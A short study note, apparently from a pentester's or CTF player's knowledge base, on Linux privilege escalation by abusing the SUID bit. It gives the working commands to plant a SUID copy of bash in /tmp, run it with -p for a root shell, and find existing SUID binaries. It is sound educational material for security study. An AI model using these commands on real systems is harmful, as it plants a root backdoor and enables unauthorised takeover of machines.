---
tags: [technique, privesc, linux]
---
# SUID Abuse

> **SUID bit**: a program always runs **with the permissions of its owner**, no matter who starts it. If root owns it → execution as root.

## SUID bash as a root shell

When a root process (cron job, service, sudo command) runs an attacker-controlled command:

```bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

Then:

```bash
/tmp/rootbash -p     # -p = keep elevated privileges
id                   # euid=0(root)
```

> [!danger] `chmod +s` is not enough
> `+s` → `-rws--S---` (SUID, but **no `x`** for group/others) → `Permission denied`.
> `chmod 4755` → `-rwsr-xr-x` → executable for everyone. Number logic → [[File Permissions and chmod]].

## Finding existing SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

=> check the found binaries against [GTFOBins](https://gtfobins.github.io/).

## Why `-p`?

Without `-p`, bash drops the SUID privileges on start for safety. With `-p` the root privileges are kept.
